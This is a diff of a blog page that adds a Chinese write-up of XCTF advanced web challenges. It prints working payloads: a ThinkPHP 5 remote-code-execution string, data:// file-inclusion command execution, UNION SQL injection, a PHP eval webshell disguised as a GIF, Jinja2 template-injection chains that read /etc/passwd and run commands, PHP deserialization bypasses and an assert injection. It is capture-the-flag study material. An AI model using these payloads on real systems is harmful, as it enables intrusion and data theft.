@@ -324,6 +324,218 @@ if($b&gt;1234){
 <p>解码得：55,56,54,79,115,69,114,116,107,49,50</p>
 <p>将这串数字进行ASCII码转换得：786OsErtk12</p>
 <p>提交Cyberpeace{786OsErtk12}得到正确答案。</p>
+<h2 id="进阶区"><a href="#进阶区" class="headerlink" title="进阶区"></a>进阶区</h2><h3 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h3><p>题目描述：想想初始页面是哪个</p>
+<p>看见题目描述，抓包访问index.php</p>
+<p>找到FLAG: flag{very_baby_web}</p>
+<h3 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h3><p>看见题目名字，就访问了robots.txt，看到了有/fl0g.php,访问拿flag</p>
+<h3 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h3><p>进去是一个THINKPHP5的框架</p>
+<p>想办法报错暴露版本</p>
+<p>?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</p>
+<p>看到版本为ThinkPHP V5.0.20</p>
+<p>在网上找到payload</p>
+<p>s=index/think\App/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</p>
+<h3 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h3><pre><code class="php">&lt;?php
+show_source(__FILE__);
+echo $_GET[&#39;hello&#39;];
+$page=$_GET[&#39;page&#39;];
+while (strstr($page, &quot;php://&quot;)) {
+    $page=str_replace(&quot;php://&quot;, &quot;&quot;, $page);
+}
+include($page);
+?&gt;</code></pre>
+<p>文件包含漏洞</p>
+<p>利用data协议,执行命令</p>
+<pre><code class="text">data://text/plain,&lt;?php phpindo();?&gt;
+page=data://text/plain,&lt;?php%20system(%27cat%20./fl4gisisish3r3.php%27);?&gt;</code></pre>
+<p>源码看到flag</p>
+<h3 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h3><p>这道题是我万万没想到的，纯脑洞题</p>
+<pre><code>http://220.249.52.133:37433/index.php?id=1</code></pre><p>看着这个url贼像注入，结果不是</p>
+<p>直接爆破这个id，1-10000拿到flag</p>
+<p>flag在id=2333的地方</p>
+<h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>BUU做过</p>
+<p>payload:/source.php?file=hint.php?../../../../../ffffllllaaaagggg</p>
+<h3 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h3><p>search处存在sql注入</p>
+<p>2’ union select 1,2,3#</p>
+<p>什么都没过滤，常规</p>
+<pre><code class="mysql">1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3#
+
+1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;secret_table&#39;),3#
+
+1&#39; union select 1,(select group_concat(fl4g) from secret_table),3#</code></pre>
+<h3 id="PHP2"><a href="#PHP2" class="headerlink" title="PHP2"></a>PHP2</h3><p>php有源文件phps(学到了)</p>
+<pre><code class="php">&lt;?php
+if(&quot;admin&quot;===$_GET[id]) {
+  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);
+  exit();
+}
+
+$_GET[id] = urldecode($_GET[id]);
+if($_GET[id] == &quot;admin&quot;)
+{
+  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;
+  echo &quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;;
+}
+?&gt;</code></pre>
+<p>可以将id进行url编码后传入，但是要注意，url在传入的时候会自动进行一次编码，所以我们要将admin编码两次后传入</p>
+<h3 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h3><pre><code class="php">class xctf{
+public $flag = &#39;111&#39;;
+public function __wakeup(){
+exit(&#39;bad requests&#39;);
+}</code></pre>
+<p>不太懂这道题，就是考一个序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行</p>
+<pre><code class="php">&lt;?php
+class xctf
+{
+    public $flag = &#39;111&#39;;
+}
+$a=new xctf();
+echo urlencode(serialize($a));
+
+# O%3A4%3A%22xctf%22%3A1%3A%7Bs%3A4%3A%22flag%22%3Bs%3A3%3A%22111%22%3B%7D
+将1改成2
+payload:O%3A4%3A%22xctf%22%3A2%3A%7Bs%3A4%3A%22flag%22%3Bs%3A3%3A%22111%22%3B%7D</code></pre>
+<h3 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h3><p>上传了一个.jpg的文件,内容是</p>
+<pre><code class="text">GIF89a? 
+&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;</code></pre>
+<p>抓包上传的时候，更改后缀为php</p>
+<p>上传成功，蚁剑连接拿到flag</p>
+<h3 id="Web-python-template-injection"><a href="#Web-python-template-injection" class="headerlink" title="Web_python_template_injection"></a>Web_python_template_injection</h3><p>python 模板注入</p>
+<p>尝试了一下49返回了有49</p>
+<pre><code class="text">{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}} 可以执行
+
+执行任意命令:
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% endif %}{% endfor %}</code></pre>
+<p>也可以直接tplmap –os-shell拿shell</p>
+<h3 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h3><pre><code class="php">&lt;?php 
+class Demo { 
+    private $file = &#39;index.php&#39;;
+    public function __construct($file) { 
+        $this-&gt;file = $file; 
+    }
+    function __destruct() { 
+        echo @highlight_file($this-&gt;file, true); 
+    }
+    function __wakeup() { 
+        if ($this-&gt;file != &#39;index.php&#39;) { 
+            //the secret is in the fl4g.php
+            $this-&gt;file = &#39;index.php&#39;; 
+        } 
+    } 
+}
+if (isset($_GET[&#39;var&#39;])) { 
+    $var = base64_decode($_GET[&#39;var&#39;]); 
+    if (preg_match(&#39;[oc]:\d+:/i&#39;, $var)) { 
+        die(&#39;stop hacking!&#39;); 
+    } else {
+        @unserialize($var); 
+    } 
+} else { 
+    highlight_file(&quot;index.php&quot;); 
+} 
+?&gt;</code></pre>
+<p>首先要绕过正则：/i是忽略大小写</p>
+<p><img src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/20200604003149.png" alt=""></p>
+<p>所以要把O:4改成O:+4</p>
+<p>再把成员数改大，就可以绕过了</p>
+<pre><code class="php">&lt;?php
+class Demo {
+    private $file = &#39;fl4g.php&#39;;
+}
+
+
+$a=new Demo();
+#echo serialize($a);
+$str=&#39;O:+4:&quot;Demo&quot;:2:{s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;}&#39;;
+echo base64_encode($str);
+
+?&gt;</code></pre>
+<h3 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h3><pre><code class="python">import flask
+import os
+
+app = flask.Flask(__name__)
+
+app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)
+
+@app.route(&#39;/&#39;)
+def index():
+    return open(__file__).read()
+
+@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)
+def shrine(shrine):
+
+    def safe_jinja(s):
+        s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)
+        blacklist = [&#39;config&#39;, &#39;self&#39;]
+        return &#39;&#39;.join([&#39;{{% set {}=None%}}&#39;.format(c) for c in blacklist]) + s
+
+    return flask.render_template_string(safe_jinja(shrine))
+
+if __name__ == &#39;__main__&#39;:
+    app.run(debug=True)</code></pre>
+<p>访问 /shrine/ 是 404，访问 /shrine/49 可以发现存在 SSTI 漏洞，在代码中        过滤了 (, ), config, self ，并且说明了 flag 在 config 中</p>
+<p>这里的黑名单就锁死了 <strong>subclasses</strong>() 以及 config 和 self.<strong>dict</strong></p>
+<p>在 flask 的官方文档中写了一个 url_for 函数，在它引用的内容中，有着current_app的全局变量，然后就可以直接读取 flag 了      </p>
+<p>url_for.<strong>globals</strong>[‘current_app’].config[‘FLAG’]</p>
+<h3 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h3><p>在about页面有个Git，想到git泄露，用githack试了下</p>
+<p>有几个php文件</p>
+<p>首先是index.php</p>
+<pre><code class="php">&lt;?php
+if (isset($_GET[&#39;page&#39;])) {
+    $page = $_GET[&#39;page&#39;];
+} else {
+    $page = &quot;home&quot;;
+}
+$file = &quot;templates/&quot; . $page . &quot;.php&quot;;
+// I heard &#39;..&#39; is dangerous!
+assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);
+// TODO: Make this look nice
+assert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;);
+?&gt;</code></pre>
+<p>有个flag.php,要想办法读到flag.php</p>
+<p>assert函数是可以执行系统命令的，得想办法闭合assert</p>
+<pre><code class="php">assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) === false&quot;)
+    填写file 123&#39;) or system(&#39;ls&#39;);//
+assert(&quot;strpos(&#39;123&#39;) or system(&#39;ls&#39;);// &#39;, &#39;..&#39;) === false&quot;)</code></pre>
+<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><pre><code class="php">&lt;?php
+$miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;
+
+function encode($str){
+    $_o=strrev($str);
+    // echo $_o;
+
+    for($_0=0;$_0&lt;strlen($_o);$_0++){
+
+        $_c=substr($_o,$_0,1);
+        $__=ord($_c)+1;
+        $_c=chr($__);
+        $_=$_.$_c;   
+    } 
+    return str_rot13(strrev(base64_encode($_)));
+}
+
+highlight_file(__FILE__);
+/*
+   逆向加密算法，解密$miwen就是flag
+*/
+?&gt;</code></pre>
+<p>加密的关键步骤就是讲明文每一位都让ascii码加1</p>
+<p>解密脚本</p>
+<pre><code class="php">&lt;?php
+$a=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;
+$a=str_rot13($a);
+$a=strrev($a);
+$a=base64_decode($a);
+
+function decode($str){
+    $b=&quot;&quot;;
+    for($i=0;$i&lt;strlen($str);$i++){
+        $b=$b.(chr(ord($str[$i])-1));
+    }
+    return $b;
+}
+
+echo strrev(decode($a));
+?&gt;</code></pre>
 
         </div>
         <!-- .entry-content -->
@@ -357,7 +569,7 @@ if($b&gt;1234){
           
             <div class="post-nepre half previous">
           
-            <a href="/2020/06/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98/" rel="prev">
+            <a href="/2020/06/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98/" rel="prev">
               <div class="background">
 <!--                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/45.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/T1h2er3/ImgHosting/img/45.jpg">-->
                 
